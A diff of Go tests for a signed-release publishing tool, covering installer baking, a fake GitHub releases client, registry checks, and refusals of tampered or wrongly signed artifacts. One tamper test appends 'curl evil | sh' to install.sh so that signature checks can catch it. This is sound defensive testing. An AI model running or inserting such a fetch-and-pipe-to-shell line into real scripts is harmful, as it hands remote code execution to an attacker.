@@ -1,42 +1,97 @@
+//nolint:gosec // test code: every path is in a directory the test made
 package main
 
 import (
 	"bytes"
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
+	"net/http"
+	"net/http/httptest"
 	"os"
 	"path/filepath"
 	"slices"
 	"strings"
 	"testing"
+
+	"github.com/knt048/vedette/internal/release"
 )
 
-// signedRelease builds a signed, verified release directory with the container assets, install.sh and its signature, and returns
-// it with its summary and description.
-func signedRelease(t *testing.T) (string, *Summary, *Inputs) {
+// bakeInstaller writes install.sh with its three baked lines (as part A does) and signs it with the trusted comment comment.
+func bakeInstaller(t *testing.T, r *rig, dir string, in Inputs, version, comment string) {
 	t.Helper()
-	r := newRig(t)
+	sums := map[string]string{}
+	for _, f := range in.Host.Files {
+		sum, _, err := hashFile(f)
+		must(t, err)
+		_, arch, _ := release.ParseHostPackageName(filepath.Base(f))
+		sums[arch] = sum
+	}
+	sh := "#!/bin/sh\nset -eu\nVEDETTE_VERSION=\"" + version + "\"\nVEDETTE_DEB_SHA256_AMD64=\"" + sums["amd64"] + "\"\nVEDETTE_DEB_SHA256_ARM64=\"" + sums["arm64"] + "\"\necho install\n"
+	must(t, os.WriteFile(filepath.Join(dir, installer), []byte(sh), 0o600))
+	must(t, testSigner{t, r.active}.SignFile(context.Background(), filepath.Join(dir, installer), filepath.Join(dir, installerSig), comment))
+}
+
+// signedRelease builds a signed, verified release directory (with the container assets and a baked, signed install.sh) on top of
+// the published index in prevDir ("" for the first release).
+func signedRelease(t *testing.T, r *rig, version, prevDir string) (string, *Summary, *Inputs) {
+	t.Helper()
 	var in Inputs
 	assets := writeAssets(t)
-	dir, err := r.build(buildOpts{version: "0.2.0", channel: "stable", cur: addOnlyTree, services: []string{"core", "sensor", "scan"}, installModes: bothModes,
+	dir, err := r.build(buildOpts{version: version, channel: "stable", cur: addOnlyTree, services: []string{"core", "sensor", "scan"}, installModes: bothModes, prevDir: prevDir,
 		beforeSign: func(dir string, x Inputs) {
 			assets(dir, x)
 			in = x
-			must(t, os.WriteFile(filepath.Join(dir, installer), []byte("#!/bin/sh\nVEDETTE_VERSION=\"0.2.0\"\n"), 0o600))
-			must(t, os.WriteFile(filepath.Join(dir, installerSig), []byte("sig\n"), 0o600))
+			bakeInstaller(t, r, dir, x, version, "file:install.sh version:"+version)
 		}})
 	must(t, err)
-	s, err := VerifyDir(dir, "", r.trust)
+	s, err := VerifyDir(dir, prevDir, r.trust)
 	must(t, err)
 	return dir, s, &in
 }
 
-// ghFake is GitHub releases in memory: view, create, upload, edit.
+// ghFake is GitHub releases in memory: view, create, upload, edit, download.
 type ghFake struct {
-	rel     map[string]*ghRelease
-	noTag   bool
-	corrupt string // an uploaded asset of this name gets another digest
+	rel         map[string]*ghRelease
+	blobs       map[string]map[string][]byte
+	noTag       bool
+	corrupt     string // an uploaded asset of this name gets another digest
+	noDigest    bool   // GitHub reports no digest (older assets)
+	badDownload string // a download of this asset returns other bytes
+}
+
+func newGH() *ghFake {
+	return &ghFake{rel: map[string]*ghRelease{indexTag: {Assets: []ghAsset{}}}, blobs: map[string]map[string][]byte{}}
+}
+
+func (g *ghFake) put(tag, name string, b []byte) {
+	r := g.rel[tag]
+	h := sha256.Sum256(b)
+	d := "sha256:" + hex.EncodeToString(h[:])
+	if name == g.corrupt {
+		d = digestOf("other")
+	}
+	a := ghAsset{Name: name, Size: int64(len(b)), Digest: &d, State: "uploaded"}
+	if g.noDigest {
+		a.Digest = nil
+	}
+	r.Assets = slices.DeleteFunc(r.Assets, func(x ghAsset) bool { return x.Name == name })
+	r.Assets = append(r.Assets, a)
+	if g.blobs[tag] == nil {
+		g.blobs[tag] = map[string][]byte{}
+	}
+	g.blobs[tag][name] = b
+}
+
+// seedIndex publishes the index of dir on the release "index", as an earlier release did.
+func (g *ghFake) seedIndex(t *testing.T, dir string) {
+	for _, n := range []string{indexFile, indexFile + ".minisig"} {
+		b, err := os.ReadFile(filepath.Join(dir, n))
+		must(t, err)
+		g.put(indexTag, n, b)
+	}
 }
 
 func (g *ghFake) fn(argv []string) ([]byte, error) {
@@ -52,34 +107,25 @@ func (g *ghFake) fn(argv []string) ([]byte, error) {
 	}
 	tag := argv[3]
 	r := g.rel[tag]
+	if r == nil && argv[2] != "create" {
+		return nil, errors.New("gh release " + argv[2] + ": exit status 1: release not found")
+	}
 	switch argv[2] {
 	case "view":
-		if r == nil {
-			return nil, errors.New("gh release view: exit status 1: release not found")
-		}
 		return json.Marshal(r)
 	case "create":
-		if !slices.Contains(argv, "--verify-tag") || !slices.Contains(argv, "--draft") {
-			return nil, errors.New("create without --verify-tag --draft")
+		if !slices.Contains(argv, "--verify-tag") || !slices.Contains(argv, "--draft") || !slices.Contains(argv, "--notes-file") {
+			return nil, errors.New("create without --verify-tag --draft --notes-file")
 		}
 		g.rel[tag] = &ghRelease{IsDraft: true}
 		return nil, nil
 	case "upload":
-		if r == nil {
-			return nil, errors.New("release not found")
-		}
 		for _, f := range argv[7:] { // gh release upload <tag> --repo R --clobber <files>
-
-			sum, size, err := hashFile(f)
+			b, err := os.ReadFile(f)
 			if err != nil {
 				return nil, err
 			}
-			d := "sha256:" + sum
-			if filepath.Base(f) == g.corrupt {
-				d = digestOf("other")
-			}
-			r.Assets = slices.DeleteFunc(r.Assets, func(x ghAsset) bool { return x.Name == filepath.Base(f) })
-			r.Assets = append(r.Assets, ghAsset{Name: filepath.Base(f), Size: size, Digest: &d, State: "uploaded"})
+			g.put(tag, filepath.Base(f), b)
 		}
 		return nil, nil
 	case "edit":
@@ -87,13 +133,53 @@ func (g *ghFake) fn(argv []string) ([]byte, error) {
 			r.IsDraft = false
 		}
 		return nil, nil
+	case "download":
+		dir := argv[slices.Index(argv, "--dir")+1]
+		for i, x := range argv {
+			if x != "--pattern" {
+				continue
+			}
+			n := argv[i+1]
+			b := g.blobs[tag][n]
+			if n == g.badDownload {
+				b = []byte("other bytes")
+			}
+			if err := os.WriteFile(filepath.Join(dir, n), b, 0o600); err != nil {
+				return nil, err
+			}
+		}
+		return nil, nil
 	}
 	return nil, errors.New("unexpected " + a)
 }
 
+// ghcr answers HEAD of a manifest with status (200: public).
+func ghcr(t *testing.T, status int) registryHTTP {
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path == "/token" {
+			_, _ = w.Write([]byte(`{"token":"anon"}`))
+			return
+		}
+		if r.Method != http.MethodHead || !strings.HasPrefix(r.URL.Path, "/v2/knt048/vedette-") || r.Header.Get("Authorization") != "Bearer anon" ||
+			!strings.Contains(r.Header.Get("Accept"), "application/vnd.oci.image.index.v1+json") {
+			w.WriteHeader(http.StatusBadRequest)
+			return
+		}
+		w.WriteHeader(status)
+	}))
+	t.Cleanup(srv.Close)
+	return registryHTTP{base: srv.URL, client: srv.Client()}
+}
+
+func env(g *ghFake, r *rig, reg registryHTTP, prevDir string, first bool) (publishEnv, *fakeRun) {
+	fr := &fakeRun{fn: g.fn}
+	return publishEnv{run: fr.run, reg: reg, repo: "repo", trust: r.trust, prevDir: prevDir, firstRelease: first, stdout: &bytes.Buffer{}}, fr
+}
+
 func TestPublishPrintsTheOrder(t *testing.T) {
-	dir, s, in := signedRelease(t)
-	p, err := planPublish(dir, s, in)
+	r := newRig(t)
+	dir, s, in := signedRelease(t, r, "0.2.0", "")
+	p, err := planPublish(dir, s, in, r.trust)
 	must(t, err)
 	want := []string{"release-manifest.json", "release-manifest.json.minisig", "install.sh", "install.sh.minisig",
 		"compose.yaml", "compose.yaml.minisig", "compose.sensors.yaml", "compose.sensors.yaml.minisig", "compose.syslog.yaml",
@@ -104,133 +190,272 @@ func TestPublishPrintsTheOrder(t *testing.T) {
 	if got := baseNames(p.Index); !slices.Equal(got, []string{"index.json", "index.json.minisig"}) {
 		t.Errorf("index %v", got)
 	}
-	g := &ghFake{rel: map[string]*ghRelease{}}
-	fr := &fakeRun{fn: g.fn}
+	e, fr := env(newGH(), r, registryHTTP{}, "", true)
 	var out bytes.Buffer
-	must(t, Publish(context.Background(), fr.run, "repo", p, false, &out))
+	e.stdout = &out
+	must(t, Publish(context.Background(), e, p, false))
 	var cmds []string
 	for _, l := range strings.Split(strings.TrimSpace(out.String()), "\n") {
 		if !strings.HasPrefix(l, "#") {
 			cmds = append(cmds, l)
 		}
 	}
-	if len(cmds) != 4 || !strings.HasPrefix(cmds[0], "gh release create v0.2.0 --repo KNT048/vedette --verify-tag --draft") ||
+	notes := filepath.Join(dir, "release-notes.md")
+	if len(cmds) != 4 || cmds[0] != "gh release create v0.2.0 --repo KNT048/vedette --verify-tag --draft --title 'Vedette 0.2.0' --notes-file "+notes ||
 		!strings.HasPrefix(cmds[1], "gh release upload v0.2.0 --repo KNT048/vedette --clobber") || cmds[2] != "gh release edit v0.2.0 --repo KNT048/vedette --draft=false" ||
-		!strings.HasPrefix(cmds[3], "gh release upload index --repo KNT048/vedette --clobber") || strings.Contains(cmds[0], "--prerelease") {
+		!strings.HasPrefix(cmds[3], "gh release upload index --repo KNT048/vedette --clobber") {
 		t.Errorf("printed:\n%s", out.String())
+	}
+	if b, err := os.ReadFile(notes); err != nil || string(b) != "Test release & <notes>\n" {
+		t.Errorf("notes file %q %v", b, err)
 	}
 	if len(fr.calls) != 1 || fr.calls[0][0] != "git" {
 		t.Errorf("printing runs nothing but the tag lookup: %v", fr.joined())
 	}
 }
 
-func TestPublishRun(t *testing.T) {
-	dir, s, in := signedRelease(t)
-	p, err := planPublish(dir, s, in)
-	must(t, err)
-	index := func() *ghRelease { return &ghRelease{Assets: []ghAsset{{Name: "README", Size: 1, State: "uploaded"}}} }
-	isIndexUpload := func(c string) bool { return strings.HasPrefix(c, "gh release upload index") }
+func isIndexUpload(c string) bool { return strings.HasPrefix(c, "gh release upload index") }
 
-	t.Run("fresh: draft, upload, check, publish, then the index last", func(t *testing.T) {
-		g := &ghFake{rel: map[string]*ghRelease{indexTag: index()}}
-		fr := &fakeRun{fn: g.fn}
-		must(t, Publish(context.Background(), fr.run, "repo", p, true, &bytes.Buffer{}))
+func TestPublishRun(t *testing.T) {
+	r := newRig(t)
+	dir, s, in := signedRelease(t, r, "0.2.0", "")
+	p, err := planPublish(dir, s, in, r.trust)
+	must(t, err)
+
+	t.Run("first release: draft, upload, check, pull check, publish, then the index last", func(t *testing.T) {
+		g := newGH()
+		e, fr := env(g, r, ghcr(t, http.StatusOK), "", true)
+		must(t, Publish(context.Background(), e, p, true))
 		calls := fr.joined()
 		ix := slices.IndexFunc(calls, isIndexUpload)
 		ed := slices.IndexFunc(calls, func(c string) bool { return strings.HasPrefix(c, "gh release edit v0.2.0") })
 		if ix < 0 || ed < 0 || ix < ed || ix != len(calls)-2 { // the index upload, then its read-back
 			t.Errorf("order: %v", calls)
 		}
-		if g.rel["v0.2.0"].IsDraft || len(g.rel["v0.2.0"].Assets) != len(p.Assets) || len(g.rel[indexTag].Assets) != 3 {
+		if g.rel["v0.2.0"].IsDraft || len(g.rel["v0.2.0"].Assets) != len(p.Assets) || len(g.rel[indexTag].Assets) != 2 {
 			t.Errorf("%+v %+v", g.rel["v0.2.0"], g.rel[indexTag])
 		}
-		// run again: the published version is compared, never uploaded to again; the index goes up again
-		fr2 := &fakeRun{fn: g.fn}
-		must(t, Publish(context.Background(), fr2.run, "repo", p, true, &bytes.Buffer{}))
-		if slices.ContainsFunc(fr2.joined(), func(c string) bool { return strings.Contains(c, " v0.2.0 ") && !strings.Contains(c, "view") }) {
-			t.Errorf("a published release was changed: %v", fr2.joined())
+		// the next release builds on this index: -prev-index equal to the live one, the published v0.2.0 untouched
+		dir2, s2, in2 := signedRelease(t, r, "0.3.0", dir)
+		p2, err := planPublish(dir2, s2, in2, r.trust)
+		must(t, err)
+		e2, fr2 := env(g, r, ghcr(t, http.StatusOK), dir, false)
+		must(t, Publish(context.Background(), e2, p2, true))
+		if slices.ContainsFunc(fr2.joined(), func(c string) bool { return strings.Contains(c, " v0.2.0 ") }) {
+			t.Errorf("%v", fr2.joined())
+		}
+		// and a run again of 0.3.0 changes nothing published
+		e3, fr3 := env(g, r, ghcr(t, http.StatusOK), dir, false)
+		if err := Publish(context.Background(), e3, p2, true); err == nil || !strings.Contains(err.Error(), "differs from -prev-index") {
+			t.Errorf("the index moved on to 0.3.0, so -prev-index (0.2.0's) is stale: %v", err)
+		}
+		if slices.ContainsFunc(fr3.joined(), func(c string) bool {
+			return strings.HasPrefix(c, "gh release upload") || strings.HasPrefix(c, "gh release create")
+		}) {
+			t.Errorf("%v", fr3.joined())
 		}
 	})
 	t.Run("a draft left by a failed run is filled again", func(t *testing.T) {
-		g := &ghFake{rel: map[string]*ghRelease{indexTag: index(), "v0.2.0": {IsDraft: true}}}
-		fr := &fakeRun{fn: g.fn}
-		must(t, Publish(context.Background(), fr.run, "repo", p, true, &bytes.Buffer{}))
+		g := newGH()
+		g.rel["v0.2.0"] = &ghRelease{IsDraft: true}
+		e, fr := env(g, r, ghcr(t, http.StatusOK), "", true)
+		must(t, Publish(context.Background(), e, p, true))
 		if slices.ContainsFunc(fr.joined(), func(c string) bool { return strings.HasPrefix(c, "gh release create") }) || g.rel["v0.2.0"].IsDraft {
 			t.Errorf("%v", fr.joined())
 		}
 	})
+	t.Run("no digest from GitHub: the asset is downloaded and hashed", func(t *testing.T) {
+		g := newGH()
+		g.noDigest = true
+		e, fr := env(g, r, ghcr(t, http.StatusOK), "", true)
+		must(t, Publish(context.Background(), e, p, true))
+		if !slices.ContainsFunc(fr.joined(), func(c string) bool { return strings.HasPrefix(c, "gh release download v0.2.0") }) {
+			t.Errorf("%v", fr.joined())
+		}
+		g2 := newGH()
+		g2.noDigest, g2.badDownload = true, "vedette.env"
+		e2, fr2 := env(g2, r, ghcr(t, http.StatusOK), "", true)
+		if err := Publish(context.Background(), e2, p, true); err == nil || !strings.Contains(err.Error(), "the downloaded vedette.env is not the verified file") {
+			t.Fatalf("%v", err)
+		}
+		if slices.ContainsFunc(fr2.joined(), func(c string) bool { return strings.HasPrefix(c, "gh release edit") || isIndexUpload(c) }) {
+			t.Errorf("%v", fr2.joined())
+		}
+	})
+
 	refusals := map[string]struct {
-		g        *ghFake
-		want     string
-		noIndex  bool
-		noCreate bool
+		setup     func(g *ghFake) (prev string, first bool)
+		pull      int
+		want      string
+		published bool // the version release may have been published (only the index step refused)
 	}{
-		"no tag":                {g: &ghFake{noTag: true}, want: "no tag v0.2.0", noCreate: true},
-		"no index release":      {g: &ghFake{rel: map[string]*ghRelease{}}, want: `no published release "index"`},
-		"upload corrupted":      {g: &ghFake{corrupt: "vedette.env"}, want: "still a draft"},
-		"published and changed": {g: &ghFake{rel: map[string]*ghRelease{"v0.2.0": {Assets: []ghAsset{{Name: "release-manifest.json", Size: 1, State: "uploaded"}}}}}, want: "never changed", noCreate: true},
+		"no tag":                     {setup: func(g *ghFake) (string, bool) { g.noTag = true; return "", true }, want: "no tag v0.2.0"},
+		"no index release":           {setup: func(g *ghFake) (string, bool) { delete(g.rel, indexTag); return "", true }, want: `no published release "index"`},
+		"not first but no index yet": {setup: func(*ghFake) (string, bool) { return "", false }, want: "only the first release"},
+		"first but an index is live": {setup: func(g *ghFake) (string, bool) { g.seedIndex(t, dir); return "", true }, want: "already has an index.json"},
+		"no -prev-index":             {setup: func(g *ghFake) (string, bool) { g.seedIndex(t, dir); return "", false }, want: "needs -prev-index"},
+		"upload corrupted":           {setup: func(g *ghFake) (string, bool) { g.corrupt = "vedette.env"; return "", true }, want: "still a draft"},
+		"package private":            {setup: func(*ghFake) (string, bool) { return "", true }, pull: http.StatusUnauthorized, want: "make the package public"},
+		"published and changed": {setup: func(g *ghFake) (string, bool) {
+			g.rel["v0.2.0"] = &ghRelease{Assets: []ghAsset{{Name: "release-manifest.json", Size: 1, State: "uploaded"}}}
+			return "", true
+		}, want: "never changed", published: true},
+		"a stray asset on the draft": {setup: func(g *ghFake) (string, bool) {
+			g.rel["v0.2.0"] = &ghRelease{IsDraft: true}
+			g.put("v0.2.0", "notes.txt", []byte("x"))
+			return "", true
+		}, want: "gh release delete-asset v0.2.0 notes.txt --repo KNT048/vedette"},
 	}
 	for name, c := range refusals {
 		t.Run(name, func(t *testing.T) {
-			if c.g.rel == nil {
-				c.g.rel = map[string]*ghRelease{indexTag: index()}
-			} else if name != "no index release" {
-				c.g.rel[indexTag] = index()
+			g := newGH()
+			prev, first := c.setup(g)
+			pull := c.pull
+			if pull == 0 {
+				pull = http.StatusOK
 			}
-			fr := &fakeRun{fn: c.g.fn}
-			err := Publish(context.Background(), fr.run, "repo", p, true, &bytes.Buffer{})
+			e, fr := env(g, r, ghcr(t, pull), prev, first)
+			err := Publish(context.Background(), e, p, true)
 			if err == nil || !strings.Contains(err.Error(), c.want) {
 				t.Fatalf("got %v, want %q", err, c.want)
 			}
-			if slices.ContainsFunc(fr.joined(), isIndexUpload) {
-				t.Errorf("the index went up: %v", fr.joined())
+			calls := fr.joined()
+			if slices.ContainsFunc(calls, isIndexUpload) {
+				t.Errorf("the index went up: %v", calls)
 			}
-			if c.noCreate && slices.ContainsFunc(fr.joined(), func(c string) bool {
-				return strings.HasPrefix(c, "gh release create") || strings.HasPrefix(c, "gh release upload")
-			}) {
-				t.Errorf("%v", fr.joined())
+			if !c.published && slices.ContainsFunc(calls, func(c string) bool { return strings.HasPrefix(c, "gh release edit") }) {
+				t.Errorf("the release was published: %v", calls)
 			}
 		})
 	}
+	t.Run("a file changed after it was verified", func(t *testing.T) {
+		dir, s, in := signedRelease(t, r, "0.2.0", "")
+		p, err := planPublish(dir, s, in, r.trust)
+		must(t, err)
+		must(t, os.WriteFile(filepath.Join(dir, "compose.yaml"), []byte("# changed\n"), 0o600))
+		e, fr := env(newGH(), r, ghcr(t, http.StatusOK), "", true)
+		if err := Publish(context.Background(), e, p, true); err == nil || !strings.Contains(err.Error(), "changed since it was verified") {
+			t.Fatalf("%v", err)
+		}
+		if slices.ContainsFunc(fr.joined(), func(c string) bool { return strings.HasPrefix(c, "gh release upload") }) {
+			t.Errorf("%v", fr.joined())
+		}
+	})
 }
 
 func TestPlanPublishRefusals(t *testing.T) {
+	r := newRig(t)
+	other := newRig(t)
 	cases := map[string]struct {
-		mut  func(dir string, in *Inputs)
+		mut  func(dir string, in *Inputs, s *Summary)
 		want string
 	}{
-		"no install.sh":          {func(d string, _ *Inputs) { must(t, os.Remove(filepath.Join(d, installer))) }, "release-bake-install"},
-		"no install.sh.minisig":  {func(d string, _ *Inputs) { must(t, os.Remove(filepath.Join(d, installerSig))) }, "release-bake-install"},
-		"package rebuilt":        {func(_ string, in *Inputs) { must(t, os.WriteFile(in.Host.Files[1], []byte("other"), 0o600)) }, "not the package the signed manifest names"},
-		"package not described":  {func(_ string, in *Inputs) { in.Host.Files = in.Host.Files[:1] }, "names no vedette-host_0.2.0_arm64.deb"},
-		"description of another": {func(_ string, in *Inputs) { in.Version = "0.2.1" }, "release.in.json is for"},
-		"a container file gone":  {func(d string, _ *Inputs) { must(t, os.Remove(filepath.Join(d, "compose.yaml.minisig"))) }, "compose.yaml.minisig is missing"},
+		"no install.sh":         {func(d string, _ *Inputs, _ *Summary) { must(t, os.Remove(filepath.Join(d, installer))) }, "release-bake-install"},
+		"no install.sh.minisig": {func(d string, _ *Inputs, _ *Summary) { must(t, os.Remove(filepath.Join(d, installerSig))) }, "release-bake-install"},
+		"install.sh changed after signing": {func(d string, _ *Inputs, _ *Summary) {
+			f, err := os.OpenFile(filepath.Join(d, installer), os.O_APPEND|os.O_WRONLY, 0)
+			must(t, err)
+			_, _ = f.WriteString("curl evil | sh\n")
+			must(t, f.Close())
+		}, "install.sh"},
+		"install.sh of another release": {func(d string, in *Inputs, _ *Summary) {
+			bakeInstaller(t, r, d, *in, "0.2.0", "file:install.sh version:0.1.0")
+		}, "trusted comment"},
+		"install.sh comment of another file": {func(d string, in *Inputs, _ *Summary) {
+			bakeInstaller(t, r, d, *in, "0.2.0", "file:compose.yaml version:0.2.0")
+		}, "trusted comment"},
+		"install.sh signed by the backup key": {func(d string, in *Inputs, _ *Summary) {
+			bakeInstaller(t, r, d, *in, "0.2.0", "file:install.sh version:0.2.0")
+			must(t, testSigner{t, r.backup}.SignFile(context.Background(), filepath.Join(d, installer), filepath.Join(d, installerSig), "file:install.sh version:0.2.0"))
+		}, "the manifest by"},
+		"install.sh signed by another key": {func(d string, _ *Inputs, _ *Summary) {
+			must(t, testSigner{t, other.active}.SignFile(context.Background(), filepath.Join(d, installer), filepath.Join(d, installerSig), "file:install.sh version:0.2.0"))
+		}, "install.sh"},
+		"baked version wrong": {func(d string, in *Inputs, _ *Summary) {
+			bakeInstaller(t, r, d, *in, "0.1.9", "file:install.sh version:0.2.0")
+		}, `VEDETTE_VERSION="0.1.9"`},
+		"baked sha256 wrong": {func(d string, in *Inputs, _ *Summary) {
+			x := *in
+			x.Host = &HostIn{Version: "0.2.0", Files: []string{in.Host.Files[1], in.Host.Files[1]}}
+			bakeInstaller(t, r, d, x, "0.2.0", "file:install.sh version:0.2.0")
+		}, "VEDETTE_DEB_SHA256_"},
+		"baked line twice": {func(d string, in *Inputs, _ *Summary) {
+			bakeInstaller(t, r, d, *in, "0.2.0", "file:install.sh version:0.2.0")
+			b, _ := os.ReadFile(filepath.Join(d, installer))
+			must(t, os.WriteFile(filepath.Join(d, installer), append(b, "VEDETTE_VERSION=\"0.2.0\"\n"...), 0o600))
+			must(t, testSigner{t, r.active}.SignFile(context.Background(), filepath.Join(d, installer), filepath.Join(d, installerSig), "file:install.sh version:0.2.0"))
+		}, "2 times"},
+		"package rebuilt": {func(_ string, in *Inputs, _ *Summary) {
+			must(t, os.WriteFile(in.Host.Files[1], []byte("other"), 0o600))
+		}, "not the package the signed manifest names"},
+		"package not described":  {func(_ string, in *Inputs, _ *Summary) { in.Host.Files = in.Host.Files[:1] }, "names no vedette-host_0.2.0_arm64.deb"},
+		"description of another": {func(_ string, in *Inputs, _ *Summary) { in.Version = "0.2.1" }, "release.in.json is for"},
+		"a container file gone": {func(d string, _ *Inputs, _ *Summary) {
+			must(t, os.Remove(filepath.Join(d, "compose.yaml.minisig")))
+		}, "compose.yaml.minisig is missing"},
+		"a symlink": {func(d string, _ *Inputs, _ *Summary) {
+			p := filepath.Join(d, "compose.yaml")
+			must(t, os.Rename(p, p+".real"))
+			must(t, os.Symlink(p+".real", p))
+		}, "a symlink is refused"},
+		"a test version": {func(_ string, _ *Inputs, s *Summary) { s.Version = "0.2.0-test.1" }, "-test."},
 	}
 	for name, c := range cases {
 		t.Run(name, func(t *testing.T) {
-			dir, s, in := signedRelease(t)
-			c.mut(dir, in)
-			if _, err := planPublish(dir, s, in); err == nil || !strings.Contains(err.Error(), c.want) {
+			dir, s, in := signedRelease(t, r, "0.2.0", "")
+			c.mut(dir, in, s)
+			if _, err := planPublish(dir, s, in, r.trust); err == nil || !strings.Contains(err.Error(), c.want) {
 				t.Fatalf("got %v, want %q", err, c.want)
 			}
 		})
 	}
 }
 
+func TestRequireProductionSigners(t *testing.T) {
+	r, other := newRig(t), newRig(t)
+	dir, s, in := signedRelease(t, r, "0.2.0", "")
+	p, err := planPublish(dir, s, in, r.trust)
+	must(t, err)
+	if p.ManifestKeyID != r.trust.Active.KeyID() || p.IndexKeyID != r.trust.Active.KeyID() {
+		t.Fatalf("%+v", p)
+	}
+	must(t, requireProductionSigners(p, r.trust))
+	if err := requireProductionSigners(p, other.trust); err == nil || !strings.Contains(err.Error(), "not by the production key") {
+		t.Errorf("signed by keys of -keys-dir, not the compiled-in ones: %v", err)
+	}
+	test := r.trust
+	test.TestOnly = true
+	if err := requireProductionSigners(p, test); err == nil || !strings.Contains(err.Error(), "throwaway") {
+		t.Errorf("%v", err)
+	}
+	backup := *p
+	backup.ManifestKeyID, backup.IndexKeyID = r.trust.Backup.KeyID(), r.trust.Backup.KeyID()
+	if err := requireProductionSigners(&backup, r.trust); err == nil {
+		t.Error("the backup key signs only a rescue")
+	}
+	backup.Rescue = true
+	must(t, requireProductionSigners(&backup, r.trust))
+}
+
 func TestPublishRefreshIsTheIndexOnly(t *testing.T) {
+	r := newRig(t)
+	prev, _, _ := signedRelease(t, r, "0.2.0", "")
 	dir := t.TempDir()
 	for _, n := range []string{"index.json", "index.json.minisig"} {
 		must(t, os.WriteFile(filepath.Join(dir, n), []byte(n), 0o600))
 	}
-	p, err := planPublish(dir, &Summary{IndexOnly: true}, nil)
+	p, err := planPublish(dir, &Summary{IndexOnly: true, IndexKeyID: r.trust.Active.KeyID()}, nil, r.trust)
 	must(t, err)
-	if p.Version != "" || len(p.Assets) != 0 || len(p.Index) != 2 {
+	if p.Version != "" || len(p.Assets) != 0 || len(p.Index) != 2 || len(p.Images) != 0 {
 		t.Fatalf("%+v", p)
 	}
-	g := &ghFake{rel: map[string]*ghRelease{indexTag: {}}}
-	fr := &fakeRun{fn: g.fn}
-	must(t, Publish(context.Background(), fr.run, "repo", p, true, &bytes.Buffer{}))
-	if calls := fr.joined(); len(calls) != 3 || !strings.HasPrefix(calls[1], "gh release upload index") {
+	must(t, requireProductionSigners(p, r.trust))
+	g := newGH()
+	g.seedIndex(t, prev)
+	e, fr := env(g, r, registryHTTP{}, prev, false)
+	must(t, Publish(context.Background(), e, p, true))
+	calls := fr.joined()
+	if slices.ContainsFunc(calls, func(c string) bool { return strings.HasPrefix(c, "git") || strings.Contains(c, " v0.") }) || calls[len(calls)-2] != "gh release upload index --repo KNT048/vedette --clobber "+strings.Join(p.Index, " ") {
 		t.Errorf("%v", calls)
 	}
 }
